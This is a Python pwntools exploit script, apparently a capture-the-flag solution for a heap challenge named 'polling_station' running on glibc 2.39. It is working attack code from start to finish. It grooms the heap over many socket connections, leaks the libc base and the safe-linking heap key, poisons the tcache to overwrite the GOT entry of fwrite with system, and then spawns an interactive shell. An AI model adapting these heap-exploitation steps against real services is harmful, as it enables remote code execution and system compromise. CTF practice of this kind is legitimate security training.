#!/usr/bin/env python3

from pwn import *
import socket

"""
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
"""
exe = ELF("./polling_station_patched")
libc = ELF("./libc.so.6") # GLIBC 2.39
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

HOST = (args.HOST or "localhost")
PORT = (args.PORT or 1337)


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
                                    ## break on malloc
                                    # b *main+0xc4
                                    ## break on strlcpy
                                    # b *main+0x10e
                                    ## break on free
                                    # b *main+0x2ce
                                    ## break on tcache poison
                                    b *main+0xc4 if $rdi == 0
                                    ## break on GOT overwrite
                                    b *main+0xc4 if $rdi == 0x3a
                                    c   # continue immediately, bc polling
                                    """)
    else:
        r = remote(HOST, PORT)

    return r


def alloc(conn,
          size: int,
          msg:bytes=b"",) -> socket:
    """
    allocate a buffer in the heap of a given size, containing a specified
    message

    params
    ------
    size (int): the desired size of the buffer
    msg (bytes): the data that should be placed into the buffer, with length
                 less than size. if longer, than the message will be truncated
                 to the desired length

    returns
    -------
    the connection used to allocate that buffer
    """
    conn.sendafter(b'\n', msg[:size].ljust(size, b'\x00'))
    return conn


def main():
    r = conn()

    # collect port information
    r.recvuntil(b"port ")
    poll_port = int(r.recvuntil(b"\n", drop=True))

    r.info(f"opened vuln port on {poll_port=}")

    # keep track of all connections
    fds = [r] + [None] * 10

    # try to get a leak
    # """
    ## setup a socket to block the connection
    fds[1] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    fds[1].connect((HOST, poll_port))
    sleep(1)
    ## setup buffers as needed
    for i in range(9):
        fds[i+2] = remote(HOST, poll_port)
        sleep(1)

    ## block the free loop to set up multiple writes
    fds[1].send(b'\0', socket.MSG_OOB)

    ## fill tcache
    buf_size = 0x40
    ## setup tcache poison
    alloc(fds[2], buf_size)
    fds[2].close()
    sleep(1)

    for i in range(6):
        alloc(fds[3+i], buf_size+0x10*i)
        fds[i+2].close()
        sleep(1)

    ## one buffer needs to go into the unsorted bin
    alloc(fds[9], 0x4000)
    fds[9].close()
    ## and one stays alive just to keep it from being eaten by wilderness
    alloc(fds[10], buf_size)
    fds[10].close()
    sleep(1)

    fds[1].send(b'\0')
    fds[1].close()
    sleep(1)

    # clear output
    [r.recvline() for _ in range(10)]

    r.info(f"heap should be ready to leak")
    
    # pause()

    # """ targeted leaks for libc and heap key
    fds[1] = remote(HOST, poll_port)
    alloc(fds[1], 0x4000)
    sleep(1)
    fds[1].close()
    sleep(1)
    r.recvuntil(b"\x00\x00")
    addr_main_arena = unpack(r.recvuntil(b"\x00" * 8), # this should be after
                             "all")                    # the next pointer
    libc.address = addr_main_arena - 0x203b20 # collected from the difference in
                                              # page addresses for `libc`
                                              # globals and `libc` base, plus
                                              # the offset of the unsorted bin
                                              # head in that page

    fds[1] = remote(HOST, poll_port)
    ## reclaim a tcache bin, which will point to the next
    alloc(fds[1], buf_size)
    r.recvuntil(b": ")
    wonky_key = unpack(r.recvuntil(b"\x00" * 8), # similar to above
                       "all")
    ## the wonky key has itself partially xor-ed, but the MSBs remain untouched
    ## thus, we can undo it. once is enough since addresses are 32b
    heap_key = (wonky_key ^ (wonky_key >> 12)) >> 12
    # """

    r.success(f"leaked {libc.address=:x}, {heap_key=:x}")
    r.recvline()

    # tcache poison to get an address to the GOT entry of some function
    ## (using fwrite here, but any function where the controllable buffer ends
    ## up in the first argument will work)
    r.info(f"tcache poison {exe.got['fwrite']-0x10=:x} ({exe.got['fwrite']^heap_key:x})")
    fds[1] = remote(HOST, poll_port)
    sleep(1)
    # explaination for this payload is further below
    alloc(fds[1], 0x80, flat({ # size does not matter here lol, as long as
                               # everything is written
        # 0x68: 0x01010101_01010101, # set size and flags
        0x70: heap_key ^ (exe.got["fwrite"]),
    }))
    fds[1].close()
    r.recvline()

    ## call `malloc` with zero, which returns the (only) address in the `0x20`
    ## tcache bin (this is because heap allocations are a minimum of 0x20 bytes
    ## due to metadata, 0x10 of which is actually "usable")
    fds[2] = remote(HOST, poll_port)
    sleep(1)
    fds[2].close()
    ## from here, the `-1`, caused by an error from `read` allows for the
    ## contents of `buf` to be written in a that overflows the allocated heap
    ## chunk. this is then the payload as previously written
    ##
    ## as a result, the payload is shaped in the following form:
    ##
    ## 0x50 bytes of padding, destroying the second entry in the tcache
    ##
    ## 0x20 bytes of just whatever, noting the following:
    ##
    ## - the first 0x10 bytes of data will be overwritten with metadata when
    ##   freed
    ## - bytes indexed from 0x10 to 0x1f will be untouched, and represent the
    ##   next chunk's previous size
    ## - last 0x8 bytes will represent the size of the chunk immediately
    ##   following this one
    ##
    ## lastly, the desired address to write to (xor'd with the leaked heap key)
    ## is written into the already freed chunk's forward pointer (fp), and thus
    ## replaces the end of the tcache list with the address we wish to write to,
    ## giving our tcache poison
    r.recvline()

    # overwrite the GOT entry
    ## since there are 3 items in the 0x50-sized tcache bin at this point, and
    ## the GOT entry is the last one, use the same trick as before to hang the
    ## process and allocate multiple chunks
    r.info("performing GOT overwrite")
    fds[1] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    fds[1].connect((HOST, poll_port))

    for i in range(3):
        fds[i+2] = remote(HOST, poll_port)
        sleep(1)

    fds[1].send(b'\0', socket.MSG_OOB)

    for i in range(2):
        ## these will be printed first before being freed. since the 0x20 chunk
        ## has been completely destroyed from the previous payload write, we can
        ## no longer free the socket hanging the process
        alloc(fds[i+2], 0x40, b"/bin/sh")
        fds[i+2].close()
        sleep(1)


    ## this is the one we want :>
    alloc(fds[4], 0x39, p64(libc.sym["system"]))
    fds[4].close()
    sleep(1)

    fds[1].send(b'\0')
    fds[1].close()
    sleep(1)

    r.recvline()

    r.success("enjoy your shell")

    r.interactive()


if __name__ == "__main__":
    main()
